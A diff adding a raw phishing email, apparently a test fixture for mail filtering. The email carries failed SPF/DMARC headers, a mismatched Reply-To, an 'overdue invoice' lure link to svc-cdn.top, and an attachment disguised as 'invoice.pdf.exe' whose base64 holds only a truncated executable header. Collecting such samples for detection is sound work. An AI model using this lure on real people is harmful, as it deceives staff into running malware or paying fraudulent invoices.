@@ -1,0 +1,40 @@
+Return-Path: <billing@svc-cdn.top>
+Received: from mta-03.svc-cdn.top (mta-03.svc-cdn.top [185.220.101.44])
+	by mx.example.org with ESMTPS id 4bK2n1;
+	Sat, 14 Mar 2026 02:09:41 +0000 (UTC)
+Received-SPF: fail (example.org: domain of svc-cdn.top does not designate
+	185.220.101.44 as permitted sender) client-ip=185.220.101.44;
+Authentication-Results: mx.example.org; spf=fail smtp.mailfrom=svc-cdn.top;
+	dkim=none; dmarc=fail (p=none) header.from=svc-cdn.top
+From: "Accounts Payable" <billing@svc-cdn.top>
+Reply-To: <ap-remit@svccdn.com>
+To: <finance@example.org>
+Subject: Invoice INV-88214 overdue - action required
+Date: Sat, 14 Mar 2026 02:09:38 +0000
+Message-ID: <20260314020938.4bK2n1@svc-cdn.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b0undary42"
+
+This is a multi-part message in MIME format.
+
+--b0undary42
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Your invoice INV-88214 is overdue.
+
+Review and settle it here: http://update.svc-cdn.top/portal/INV-88214
+A copy is attached for your records.
+
+Accounts Payable
+
+--b0undary42
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAAA=
+
+--b0undary42--
